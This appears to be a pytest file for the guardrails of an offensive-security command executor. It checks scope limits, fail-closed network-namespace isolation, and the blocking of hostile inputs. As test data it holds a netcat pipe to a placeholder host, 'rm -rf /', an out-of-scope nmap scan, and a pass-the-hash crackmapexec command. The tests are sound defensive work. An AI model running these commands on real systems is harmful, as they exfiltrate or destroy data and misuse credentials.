from scope import Scope, set_active_scope
import offense.executor as ex


def _recorder():
    calls = []

    def runner(argv, timeout=120):
        calls.append(argv)
        return "Administrator (session opened)"
    return runner, calls


def test_clean_command_calls_runner_with_argv():
    set_active_scope(Scope.from_lines(["127.0.0.1/32"]))
    runner, calls = _recorder()
    status, out = ex.execute_command("crackmapexec smb 127.0.0.1 -u a -H h", runner=runner)
    assert status == "done" and calls == [["crackmapexec", "smb", "127.0.0.1", "-u", "a", "-H", "h"]]


def test_guardrail_block_short_circuits_runner():
    set_active_scope(Scope.from_lines(["127.0.0.1/32"]))
    runner, calls = _recorder()
    assert ex.execute_command("a | nc x 4444", runner=runner)[0] == "blocked_shell_meta"
    assert ex.execute_command("rm -rf /", runner=runner)[0] == "blocked_destructive"
    assert ex.execute_command("nmap 10.0.0.9", runner=runner)[0] == "blocked_out_of_scope"
    assert calls == []   # runner NEVER called on a block


def test_empty_command_is_error():
    assert ex.execute_command("")[0] == "error"


def test_default_runner_is_netns_and_blocks_when_unavailable(monkeypatch):
    # Without an injected runner, execution goes through the network namespace; if
    # it is not in place, nothing runs (fail-closed) and the status says so.
    import offense.netns as netns
    set_active_scope(Scope.from_lines(["127.0.0.1/32"]))

    def boom(argv, timeout=120):
        raise netns.NetnsError("namespace missing")
    monkeypatch.setattr(netns, "run_isolated", boom)
    status, out = ex.execute_command("nmap 127.0.0.1")
    assert status == "blocked_no_netns" and "namespace missing" in out


def test_default_runner_passes_argv_to_netns(monkeypatch):
    import offense.netns as netns
    set_active_scope(Scope.from_lines(["127.0.0.1/32"]))
    monkeypatch.setattr(netns, "run_isolated", lambda argv, timeout=120: f"{argv}|{timeout}")
    assert ex.execute_command("nmap 127.0.0.1", timeout=9) == ("done", "['nmap', '127.0.0.1']|9")


def test_default_runner_never_reaches_plain_subprocess(monkeypatch):
    # The default path must NEVER fall back to a bare tools.registry._run
    # (without a namespace): with the network scope unavailable, _run is not called.
    import tools.registry as reg
    set_active_scope(Scope.from_lines(["127.0.0.1/32"]))
    ran = []
    monkeypatch.setattr(reg, "_run", lambda argv, timeout=120: ran.append(argv) or "executed")
    status, _out = ex.execute_command("nmap 127.0.0.1")
    assert status == "blocked_no_netns" and ran == []
